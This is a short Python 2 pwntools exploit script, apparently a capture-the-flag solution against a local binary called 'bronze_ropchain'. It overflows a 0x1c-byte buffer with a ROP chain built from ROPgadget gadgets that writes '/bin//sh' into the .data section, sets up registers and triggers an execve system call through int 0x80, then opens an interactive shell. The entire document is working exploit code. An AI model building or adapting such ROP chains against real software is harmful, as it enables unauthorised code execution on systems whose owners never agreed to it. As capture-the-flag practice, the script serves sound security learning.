#!/usr/bin/env python2

from pwn import *
from struct import pack

context.terminal = ['xfce4-terminal', '-e']

ret_addr_offset = 0x1c

p = 'A' * ret_addr_offset

# Generated with ROPgadget
p += pack('<I', 0x0807736b) # pop edx ; ret
p += pack('<I', 0x080dd060) # @ .data
p += pack('<I', 0x0805da08) # pop eax ; pop edx ; pop ebx ; ret
p += '/bin'
p += pack('<I', 0x080dd060) # padding without overwrite edx
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x0805e572) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0807736b) # pop edx ; ret
p += pack('<I', 0x080dd064) # @ .data + 4
p += pack('<I', 0x0805da08) # pop eax ; pop edx ; pop ebx ; ret
p += '//sh'
p += pack('<I', 0x080dd064) # padding without overwrite edx
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x0805e572) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0807736b) # pop edx ; ret
p += pack('<I', 0x080dd068) # @ .data + 8
p += pack('<I', 0x0804f940) # xor eax, eax ; ret
p += pack('<I', 0x0805e572) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x08049022) # pop ebx ; ret
p += pack('<I', 0x080dd060) # @ .data
p += pack('<I', 0x08077392) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080dd068) # @ .data + 8
p += pack('<I', 0x080dd060) # padding without overwrite ebx
p += pack('<I', 0x0807736b) # pop edx ; ret
p += pack('<I', 0x080dd068) # @ .data + 8
p += pack('<I', 0x0804f940) # xor eax, eax ; ret
p += pack('<I', 0x080851ee) # inc eax ; ret
p += pack('<I', 0x080851ee) # inc eax ; ret
p += pack('<I', 0x080851ee) # inc eax ; ret
p += pack('<I', 0x080851ee) # inc eax ; ret
p += pack('<I', 0x080851ee) # inc eax ; ret
p += pack('<I', 0x080851ee) # inc eax ; ret
p += pack('<I', 0x080851ee) # inc eax ; ret
p += pack('<I', 0x080851ee) # inc eax ; ret
p += pack('<I', 0x080851ee) # inc eax ; ret
p += pack('<I', 0x080851ee) # inc eax ; ret
p += pack('<I', 0x080851ee) # inc eax ; ret
p += pack('<I', 0x0804a2d2) # int 0x80

print 'Running program with payload of length ' + str(len(p))

r = process(['./bronze_ropchain'])
r.sendlineafter('name?\n', p)
r.sendline()
r.interactive()
